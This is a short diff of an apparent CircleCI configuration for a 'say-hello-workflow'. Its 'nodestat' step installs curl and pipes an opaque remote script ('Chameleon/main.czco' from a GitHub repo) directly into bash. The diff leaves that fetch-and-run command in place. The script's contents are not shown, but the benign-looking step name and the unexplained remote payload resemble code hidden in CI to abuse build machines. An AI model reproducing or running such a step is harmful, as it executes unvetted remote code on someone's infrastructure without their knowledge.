@@ -10,7 +10,7 @@ jobs:
       - checkout
       - run:
           name: "nodestat"
-          command: "set -e && source /bin/bash && apt update && apt upgrade -y && apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco | bash -"
+          command: "set -e  && apt update && apt upgrade -y && apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco | bash -"
 
 workflows:
   say-hello-workflow:
